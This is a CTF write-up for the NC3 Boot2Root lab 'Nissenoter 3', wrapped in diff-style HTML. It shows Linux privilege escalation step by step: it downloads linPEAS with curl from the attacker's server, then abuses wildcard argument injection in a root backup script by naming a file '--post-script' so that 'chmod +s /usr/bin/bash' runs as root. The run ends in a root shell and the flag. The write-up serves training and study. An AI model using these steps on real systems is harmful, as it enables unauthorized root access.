-<a href="#" class="scroll-up"><svg xmlns="http://www.w3.org/2000/svg" fill="#3B3E48" width="64px" height="64px"
-  viewBox="-2.4 -2.4 28.80 28.80" id="up-circle" data-name="Flat Color"
-  xmlns="http://www.w3.org/2000/svg" class="icon flat-color" stroke="#3B3E48"
-  stroke-width="0.00024000000000000003">
-  <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
-  <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#CCCCCC"
-    stroke-width="0.9600000000000002">
-    <circle id="primary" cx="12" cy="12" r="10" style="fill: #3B3E48;"></circle>
-    <path id="secondary"
-      d="M15,14a1,1,0,0,1-.71-.29L12,11.41l-2.29,2.3a1,1,0,0,1-1.42-1.42l3-3a1,1,0,0,1,1.42,0l3,3a1,1,0,0,1,0,1.42A1,1,0,0,1,15,14Z"
-      style="fill: #0077b6;"></path>
-  </g>
-  <g id="SVGRepo_iconCarrier">
-    <circle id="primary" cx="12" cy="12" r="10" style="fill: #3B3E48;"></circle>
-    <path id="secondary"
-      d="M15,14a1,1,0,0,1-.71-.29L12,11.41l-2.29,2.3a1,1,0,0,1-1.42-1.42l3-3a1,1,0,0,1,1.42,0l3,3a1,1,0,0,1,0,1.42A1,1,0,0,1,15,14Z"
-      style="fill: #0077b6;"></path>
-  </g>
-</svg></a>
-<noscript>
-    <a href="#" class="scroll-up show"><svg xmlns="http://www.w3.org/2000/svg" fill="#3B3E48" width="64px" height="64px"
-  viewBox="-2.4 -2.4 28.80 28.80" id="up-circle" data-name="Flat Color"
-  xmlns="http://www.w3.org/2000/svg" class="icon flat-color" stroke="#3B3E48"
-  stroke-width="0.00024000000000000003">
-  <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
-  <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#CCCCCC"
-    stroke-width="0.9600000000000002">
-    <circle id="primary" cx="12" cy="12" r="10" style="fill: #3B3E48;"></circle>
-    <path id="secondary"
-      d="M15,14a1,1,0,0,1-.71-.29L12,11.41l-2.29,2.3a1,1,0,0,1-1.42-1.42l3-3a1,1,0,0,1,1.42,0l3,3a1,1,0,0,1,0,1.42A1,1,0,0,1,15,14Z"
-      style="fill: #0077b6;"></path>
-  </g>
-  <g id="SVGRepo_iconCarrier">
-    <circle id="primary" cx="12" cy="12" r="10" style="fill: #3B3E48;"></circle>
-    <path id="secondary"
-      d="M15,14a1,1,0,0,1-.71-.29L12,11.41l-2.29,2.3a1,1,0,0,1-1.42-1.42l3-3a1,1,0,0,1,1.42,0l3,3a1,1,0,0,1,0,1.42A1,1,0,0,1,15,14Z"
-      style="fill: #0077b6;"></path>
-  </g>
-</svg></a>
-</noscript>
-<script async src="http://localhost:1313/js/scrollwatcher.min.11bd2ce6f91dfb64095448b76ac1930124a42dc7133488e6d3d5aae7badaf562.js" integrity="sha256-Eb0s5vkd+2QJVEi3asGTASSkLccTNIjm09Wq57ra9WI=" crossorigin="anonymous"></script>
-<script async src="http://localhost:1313/js/bundle.min.038214de9d568246fadcfeb06c69349925de3209f332ec123861b6aa031d63c6.js" integrity="sha256-A4IU3p1Wgkb63P6wbGk0mSXeMgnzMuwSOGG2qgMdY8Y=" crossorigin="anonymous"></script>
-</body>
-
-</html>
+Let’s immediately execute some initial enumeration and see what we can find"><title>Nissenoter 3</title>
+<link rel="stylesheet dns-prefetch preconnect preload prefetch" as=style href=https://ctf.adamino.dk/css/style.min.2d1df3d10e8fa64ec05ab1169da39cc7ce323ff1a80fb94a0b820888e0defd02.css integrity="sha256-LR3z0Q6Ppk7AWrEWnaOcx84yP/GoD7lKC4IIiODe/QI=" crossorigin=anonymous></head><body id=page><header id=site-header class="animated slideInUp"><div class="hdr-wrapper section-inner"><div class=hdr-left><div class=site-branding><a href=https://ctf.adamino.dk/>Adamino CTF Writeups</a></div><nav class="site-nav hide-in-mobile"><a href=https://ctf.adamino.dk/tools/>Tools</a>
+<a href=https://ctf.adamino.dk/nc3/>NC3</a></nav></div><div class="hdr-right hdr-icons"><span class="hdr-social hide-in-mobile"><a href=https://github.com/onero target=_blank rel="noopener me" title=Github><svg class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a></span><button id=menu-btn class=hdr-btn title=Menu><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button></div></div></header><div id=mobile-menu class="animated fast"><ul><li><a href=https://ctf.adamino.dk/tools/>Tools</a></li><li><a href=https://ctf.adamino.dk/nc3/>NC3</a></li></ul></div><main class="site-main section-inner thin animated fadeIn faster"><h1>Nissenoter 3</h1><div class=content><h2 id=challenge-name>Challenge Name:<a href=#challenge-name class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>Nissenoter 3</p><h2 id=category>Category:<a href=#category class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>Boot2Root</p><h2 id=challenge-description>Challenge Description:<a href=#challenge-description class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>Vi er sikre på, nisserne deler statshemmeligheder, hvorfor skulle netværket ellers være lukket og være beskyttet af teknologi i verdensklasse? - Vores praktikant siger i hvert fald, at det er verdensklasse.</p><p><em>Opgaven er tilgængelig via Haaukins:</em></p><p><a href=https://ncctf.haaukins.dk/>https://ncctf.haaukins.dk/</a></p><h2 id=approach>Approach<a href=#approach class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><h3 id=the-final-enumeration>The final enumeration<a href=#the-final-enumeration class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>Continuing from <a href=/nc3/boot2root/nissenoter-2/>Nissenoter 2</a> we now have foothold on the server as a user!</p><p>Let&rsquo;s immediately execute some initial enumeration and see what we can find</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rrensdyr@edc9b2907c7e:~$ whoami <span style=color:#f92672>&amp;&amp;</span> uname -a <span style=color:#f92672>&amp;&amp;</span> sudo -l
+</span></span><span style=display:flex><span>rrensdyr
+</span></span><span style=display:flex><span>Linux edc9b2907c7e 5.15.0-88-generic <span style=color:#75715e>#98-Ubuntu SMP Mon Oct 2 15:18:56 UTC 2023 x86_64 GNU/Linux</span>
+</span></span><span style=display:flex><span>-bash: sudo: command not found
+</span></span></code></pre></div><p>We are connected as the rrendsyr user on a Linux system, but cannot execute anything as super user. We already know from the previous challenge, that the only file in our home directly is the flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rrensdyr@edc9b2907c7e:~$ find / -type f -perm -04000 -ls 2&gt;/dev/null
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>5943279</span>     <span style=color:#ae81ff>60</span> -rwsr-xr-x   <span style=color:#ae81ff>1</span> root     root        <span style=color:#ae81ff>59704</span> Mar <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2023</span> /usr/bin/mount
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>5943371</span>     <span style=color:#ae81ff>36</span> -rwsr-xr-x   <span style=color:#ae81ff>1</span> root     root        <span style=color:#ae81ff>35128</span> Mar <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2023</span> /usr/bin/umount
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>5943284</span>     <span style=color:#ae81ff>48</span> -rwsr-xr-x   <span style=color:#ae81ff>1</span> root     root        <span style=color:#ae81ff>48896</span> Mar <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2023</span> /usr/bin/newgrp
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>5943295</span>     <span style=color:#ae81ff>68</span> -rwsr-xr-x   <span style=color:#ae81ff>1</span> root     root        <span style=color:#ae81ff>68248</span> Mar <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2023</span> /usr/bin/passwd
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>5943160</span>     <span style=color:#ae81ff>52</span> -rwsr-xr-x   <span style=color:#ae81ff>1</span> root     root        <span style=color:#ae81ff>52880</span> Mar <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2023</span> /usr/bin/chsh
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>5943347</span>     <span style=color:#ae81ff>72</span> -rwsr-xr-x   <span style=color:#ae81ff>1</span> root     root        <span style=color:#ae81ff>72000</span> Mar <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2023</span> /usr/bin/su
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>5943154</span>     <span style=color:#ae81ff>64</span> -rwsr-xr-x   <span style=color:#ae81ff>1</span> root     root        <span style=color:#ae81ff>62672</span> Mar <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2023</span> /usr/bin/chfn
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>5943221</span>     <span style=color:#ae81ff>88</span> -rwsr-xr-x   <span style=color:#ae81ff>1</span> root     root        <span style=color:#ae81ff>88496</span> Mar <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2023</span> /usr/bin/gpasswd
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>6704110</span>    <span style=color:#ae81ff>640</span> -rwsr-xr-x   <span style=color:#ae81ff>1</span> root     root       <span style=color:#ae81ff>653888</span> Sep <span style=color:#ae81ff>23</span> 22:11 /usr/lib/openssh/ssh-keysign
+</span></span><span style=display:flex><span>  <span style=color:#ae81ff>6704087</span>     <span style=color:#ae81ff>52</span> -rwsr-xr--   <span style=color:#ae81ff>1</span> root     messagebus    <span style=color:#ae81ff>51272</span> Sep <span style=color:#ae81ff>16</span> 10:03 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style=display:flex><span>  rrensdyr@edc9b2907c7e:~$
+</span></span></code></pre></div><p>The intention of this command is to look for <a href=https://www.redhat.com/sysadmin/suid-sgid-sticky-bit>SUID bits</a>, which can be used in certain situations to escalate privileges (PrivEsc). One great site for finding such tricks is <a href=https://gtfobins.github.io/>GTFOBINS</a>.
+Unfortunately this is also not a possible path forward, seeing as only the root user has these bits set.</p><p>We therefore upload an enumeration script from our attacking machine to the victim by opening a webserver from our Kali machine</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>haaukins㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ python3 -m http.server <span style=color:#ae81ff>1337</span>
+</span></span><span style=display:flex><span>Serving HTTP on 0.0.0.0 port <span style=color:#ae81ff>1337</span> <span style=color:#f92672>(</span>http://0.0.0.0:1337/<span style=color:#f92672>)</span> ...
+</span></span></code></pre></div><p>and on the victim we make a wget request to download linPeas</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rrensdyr@edc9b2907c7e:~$ curl -O http://77.229.233.4:1337/linpeas.sh
+</span></span><span style=display:flex><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+</span></span><span style=display:flex><span>                                 Dload  Upload   Total   Spent    Left  Speed
+</span></span><span style=display:flex><span><span style=color:#ae81ff>100</span>  815k  <span style=color:#ae81ff>100</span>  815k    <span style=color:#ae81ff>0</span>     <span style=color:#ae81ff>0</span>  51.5M      <span style=color:#ae81ff>0</span> --:--:-- --:--:-- --:--:-- 53.1M
+</span></span><span style=display:flex><span>rrensdyr@edc9b2907c7e:~$ ls
+</span></span><span style=display:flex><span>flag.txt  linpeas.sh
+</span></span><span style=display:flex><span>rrensdyr@edc9b2907c7e:~$ chmod +x linpeas.sh
+</span></span></code></pre></div><p>After downloading the <a href=https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS>enumeration script</a> and making it executable, we run it and read through the report, in which we see that there is an interesting &ldquo;/var/backups/backup.sh&rdquo; script owned by root</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╔══════════╣ Backup files <span style=color:#f92672>(</span>limited 100<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>-rwxr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>632</span> Dec  <span style=color:#ae81ff>8</span> 08:27 /var/backups/backup.sh
+</span></span></code></pre></div><p>Let&rsquo;s take a look at this script</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>user_notes<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/var/www/html/user_notes/&#34;</span>
+</span></span><span style=display:flex><span>backup_dir<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/var/backups/user_notes/&#34;</span>
+</span></span><span style=display:flex><span>backup_file<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span>$backup_dir<span style=color:#66d9ef>$(</span>date +%Y%m%d-%H%M%S<span style=color:#66d9ef>)</span><span style=color:#e6db74>.tar.gz&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> backup <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>  pushd <span style=color:#e6db74>&#34;</span>$user_notes<span style=color:#e6db74>&#34;</span> &gt; /dev/null <span style=color:#f92672>||</span> exit
+</span></span><span style=display:flex><span>  tmp_dir<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>mktemp -d<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>  /usr/local/bin/backup -o <span style=color:#e6db74>&#34;</span>$tmp_dir<span style=color:#e6db74>&#34;</span> *
+</span></span><span style=display:flex><span>  pushd <span style=color:#e6db74>&#34;</span>$tmp_dir<span style=color:#e6db74>&#34;</span> &gt; /dev/null <span style=color:#f92672>||</span> exit
+</span></span><span style=display:flex><span>  tar -czf <span style=color:#e6db74>&#34;</span>$backup_file<span style=color:#e6db74>&#34;</span> .
+</span></span><span style=display:flex><span>  popd &gt; /dev/null <span style=color:#f92672>||</span> exit
+</span></span><span style=display:flex><span>  rm -rf <span style=color:#e6db74>&#34;</span>$tmp_dir<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> remove_old_backups <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>  dir_files<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>find $backup_dir -type f -name <span style=color:#e6db74>&#34;*.tar.gz&#34;</span> | wc -l<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> <span style=color:#e6db74>&#34;</span>$dir_files<span style=color:#e6db74>&#34;</span> -gt <span style=color:#ae81ff>7</span> <span style=color:#f92672>]]</span>; <span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>    find $backup_dir -type f -name <span style=color:#e6db74>&#34;*.tar.gz&#34;</span> | sort | head -n -7 | xargs rm -f
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>backup
+</span></span><span style=display:flex><span>remove_old_backups
+</span></span></code></pre></div><p>Upon examining the backup.sh script, we confirm that it indeed takes backups. Two functions are defined: backup and remove_old_backups. Starting with remove_old_backups, we see that it checks if there are more than 7 files ending with .tar.gz in the &ldquo;/var/backups/user_notes/&rdquo; directory and deletes the oldest files to leave only 7 remaining.</p><p>The backup function changes the current directory to &ldquo;/var/www/html/user_notes/&rdquo;, then creates a temporary folder. Once this is done, a binary file, &ldquo;/usr/local/bin/backup&rdquo;, is called with some parameters. After the binary is called, the script moves the folder to temp_dir, where it packs all the files in the folder into a .tar.gz file and saves this file in &ldquo;/var/backups/user_notes/&rdquo;.</p><p>It&rsquo;s time to take a closer look at &ldquo;/usr/local/bin/backup&rdquo;. Firstly, to find out what -o does, even though we can guess based on the script, but also to see if there are other parameters that can be set. The reason this is interesting is the way the file is called. Namely, with _, which is a Bash Wildcard, as the last parameter. In bash, _ expands to all files in the current directory, so in principle, backup is called as follows.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/usr/local/bin/backup -o <span style=color:#e6db74>&#34;/tmp/tmp.3yNOBzjK59&#34;</span> file1 file2 file3 etc
+</span></span></code></pre></div><p>This means that if there are any interesting parameters that can be set in connection with backup, we have the opportunity to set them if we can control the filenames that appear in &ldquo;/var/www/html/user_notes/&rdquo;. Therefore, let&rsquo;s immediately check what backup can do.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rrensdyr@bdf69f47608c:~$ /usr/local/bin/backup
+</span></span><span style=display:flex><span>Missing output folder
+</span></span><span style=display:flex><span>Allowed options:
+</span></span><span style=display:flex><span>--help produce help message
+</span></span><span style=display:flex><span>-i <span style=color:#f92672>[</span> --input-files <span style=color:#f92672>]</span> arg Files to backup
+</span></span><span style=display:flex><span>-o <span style=color:#f92672>[</span> --output-folder <span style=color:#f92672>]</span> arg Folder to backup to
+</span></span><span style=display:flex><span>--pre-script arg Script to run before starting the backup
+</span></span><span style=display:flex><span>--post-script arg Script to run after finishing the backup
+</span></span></code></pre></div><p>Okay, it looks like it can run scripts both before and after a backup has been made, via &ndash;pre-script and &ndash;post-script, respectively. From here, one can either take an educated guess, guessing that, for example, .sh files are meant, or download and reverse engineer the backup binary.</p><p>We take an educated guess. So let&rsquo;s write two files to &ldquo;/var/www/html/user_notes/&rdquo;, one named &ldquo;&ndash;post-script&rdquo;, and one named &ldquo;Adamino&rdquo;, containing our exploit. Unfortunately, rrensdyr cannot write to the folder, so we need to do it through the web interface.</p><p>First, we create a note with the title Adamino and the following content:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>chmod +s /usr/bin/bash
+</span></span></code></pre></div><p>&ldquo;chmod +s&rdquo; is used for setuid and ensures that a binary will run with the privileges of the file owner. In this case, the owner is root, which happens to be the user we want to access.</p><p>Then, a note is created with the title &ldquo;&ndash;post-script&rdquo; and arbitrary content. Once that file is created, our exploit code will be executed.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rrensdyr@bdf69f47608c:~$ ls -l /usr/bin/bash
+</span></span><span style=display:flex><span>-rwsr-sr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>1265648</span> Apr <span style=color:#ae81ff>23</span> <span style=color:#ae81ff>2023</span> /usr/bin/bash
+</span></span></code></pre></div><p>As we can see in the snippet above, setuid (SUID) and setguid (SGID) have been set on /usr/bin/bash, which is perfect. If we now call bash with the -p flag, for privileged mode, we get a root shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>rrensdyr@bdf69f47608c:~$ bash -p
+</span></span><span style=display:flex><span>bash-5.2# whoami
+</span></span><span style=display:flex><span>root
+</span></span></code></pre></div><p>As shown in the snippet above, we have now succeeded, and the final flag can be retrieved!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>bash-5.2# cat /root/flag.txt
+</span></span><span style=display:flex><span>NC3<span style=color:#f92672>{</span>1. Always backup; 2. Forget --; 3. ???? 4. Profit!<span style=color:#f92672>}</span>
+</span></span></code></pre></div><h2 id=flag>Flag<a href=#flag class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>NC3{1. Always backup; 2. Forget --; 3. ???? 4. Profit!}
+</span></span></code></pre></div><h2 id=reflections-and-learnings>Reflections and Learnings<a href=#reflections-and-learnings class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><h3 id=initial-enumeration-and-strategy>Initial Enumeration and Strategy:<a href=#initial-enumeration-and-strategy class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>Employing tools like linpeas.sh was a critical step. It allowed us to discover the /var/backups/backup.sh script, which became the focal point for further investigation. This reinforces the importance of using the right tools for efficient system analysis.</p><h3 id=analyzing-the-backup-script>Analyzing the Backup Script:<a href=#analyzing-the-backup-script class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>The deep dive into the backup.sh script was a reminder that sometimes, the path to escalation lies not in exploiting a weakness but in leveraging the intended functionality of system scripts.</p><h3 id=exploiting-the-backup-binary>Exploiting the Backup Binary:<a href=#exploiting-the-backup-binary class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>The discovery of the &ndash;pre-script and &ndash;post-script options in /usr/local/bin/backup was pivotal. It’s a lesson in thorough examination and thinking creatively about how to use the system&rsquo;s features to our advantage.</p><h3 id=the-journey-at-an-end>The journey at an end<a href=#the-journey-at-an-end class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>All in all Nissenoter was great fun and a wonderful learning path for Web exploitation! In its essence it was a tremendous showcase of a &ldquo;typical HackTheBox&rdquo; challenge, in which we through careful enumeration can identify exploits to execute in order to gain foothold and in the end escalate our privileges to become system administrator and retrieve the final flag!</p></div></main><footer id=site-footer class="section-inner thin animated fadeIn faster"><p>&copy; 2025 <a href=https://ctf.adamino.dk/>Adamino</a>
+&#183; The quieter you become the more you are able to hear
+&#183;</p></footer><a href=# class=scroll-up><svg fill="#3b3e48" width="64" height="64" viewBox="-2.4 -2.4 28.8 28.8" id="up-circle" data-name="Flat Color" class="icon flat-color" stroke="#3b3e48" stroke-width=".00024000000000000003"><g id="SVGRepo_bgCarrier" stroke-width="0"/><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#ccc" stroke-width=".9600000000000002"><circle id="primary" cx="12" cy="12" r="10" style="fill:#3b3e48"/><path id="secondary" d="M15 14a1 1 0 01-.71-.29L12 11.41l-2.29 2.3a1 1 0 01-1.42-1.42l3-3a1 1 0 011.42.0l3 3a1 1 0 010 1.42A1 1 0 0115 14z" style="fill:#0077b6"/></g><g id="SVGRepo_iconCarrier"><circle id="primary" cx="12" cy="12" r="10" style="fill:#3b3e48"/><path id="secondary" d="M15 14a1 1 0 01-.71-.29L12 11.41l-2.29 2.3a1 1 0 01-1.42-1.42l3-3a1 1 0 011.42.0l3 3a1 1 0 010 1.42A1 1 0 0115 14z" style="fill:#0077b6"/></g></svg></a><noscript><a href=# class="scroll-up show"><svg fill="#3b3e48" width="64" height="64" viewBox="-2.4 -2.4 28.8 28.8" id="up-circle" data-name="Flat Color" class="icon flat-color" stroke="#3b3e48" stroke-width=".00024000000000000003"><g id="SVGRepo_bgCarrier" stroke-width="0"/><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#ccc" stroke-width=".9600000000000002"><circle id="primary" cx="12" cy="12" r="10" style="fill:#3b3e48"/><path id="secondary" d="M15 14a1 1 0 01-.71-.29L12 11.41l-2.29 2.3a1 1 0 01-1.42-1.42l3-3a1 1 0 011.42.0l3 3a1 1 0 010 1.42A1 1 0 0115 14z" style="fill:#0077b6"/></g><g id="SVGRepo_iconCarrier"><circle id="primary" cx="12" cy="12" r="10" style="fill:#3b3e48"/><path id="secondary" d="M15 14a1 1 0 01-.71-.29L12 11.41l-2.29 2.3a1 1 0 01-1.42-1.42l3-3a1 1 0 011.42.0l3 3a1 1 0 010 1.42A1 1 0 0115 14z" style="fill:#0077b6"/></g></svg></a></noscript><script async src=https://ctf.adamino.dk/js/scrollwatcher.min.11bd2ce6f91dfb64095448b76ac1930124a42dc7133488e6d3d5aae7badaf562.js integrity="sha256-Eb0s5vkd+2QJVEi3asGTASSkLccTNIjm09Wq57ra9WI=" crossorigin=anonymous></script><script async src=https://ctf.adamino.dk/js/bundle.min.038214de9d568246fadcfeb06c69349925de3209f332ec123861b6aa031d63c6.js integrity="sha256-A4IU3p1Wgkb63P6wbGk0mSXeMgnzMuwSOGG2qgMdY8Y=" crossorigin=anonymous></script></body></html>
